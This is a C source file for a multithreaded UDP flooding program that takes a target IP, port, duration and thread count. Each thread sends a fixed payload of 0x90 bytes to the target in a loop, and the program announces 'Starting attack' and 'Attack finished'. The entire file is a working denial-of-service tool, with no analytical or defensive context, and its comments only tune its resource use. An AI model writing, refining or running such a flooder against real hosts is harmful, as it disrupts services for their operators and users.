
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>

// Global flag for graceful shutdown
volatile sig_atomic_t running = 1;

void handle_signal(int sig) {
    running = 0;
    printf("\nShutting down gracefully...\n");
}

void usage() {
    printf("Usage: ./fix ip port time threads\n");
    exit(1);
}

struct thread_data {
    const char *ip;
    int port;
    int time;
};

// Pre-defined payload to avoid repeated allocation
const char payload[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
const size_t payload_len = 34; // Precalculated length to avoid strlen

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime = time(NULL) + data->time;
    
    // Create socket once outside the loop
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }
    
    // Set up server address once
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);
    
    // Use static buffer size
    while (time(NULL) <= endtime && running) {
        // Send with precalculated length instead of using strlen each time
        if (sendto(sock, payload, payload_len, 0, 
                  (const struct sockaddr *)&server_addr, 
                  sizeof(server_addr)) < 0) {
            if (running) { // Only show error if not during shutdown
                perror("Send failed");
            }
            break;
        }
        
        // Add small sleep to reduce CPU usage
        usleep(1000); // 1ms sleep
    }
    
    close(sock);
    free(data); // Free the thread data
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }
    
    // Set up signal handler for clean shutdown
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    
    const char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    
    // Limit excessive thread creation for low-resource systems
    if (threads > 100) {
        printf("Warning: High thread count may overload your system.\n");
        printf("Limiting to 100 threads for system stability.\n");
        threads = 100;
    }
    
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    if (!thread_ids) {
        perror("Memory allocation failed");
        return 1;
    }
    
    printf("Starting attack on %s:%d for %d seconds with %d threads\n", 
           ip, port, time, threads);
    
    // Create threads with smaller interval to reduce memory spike
    for (int i = 0; i < threads && running; i++) {
        struct thread_data *data = malloc(sizeof(struct thread_data));
        if (!data) {
            perror("Thread data allocation failed");
            continue;
        }
        
        data->ip = ip;
        data->port = port;
        data->time = time;
        
        if (pthread_create(&thread_ids[i], NULL, attack, data) != 0) {
            perror("Thread creation failed");
            free(data);
            continue;
        }
        
        // Sleep briefly between thread creation to avoid CPU spikes
        usleep(10000); // 10ms
    }
    
    // Wait for threads to complete
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }
    
    free(thread_ids);
    printf("Attack finished\n");
    return 0;
}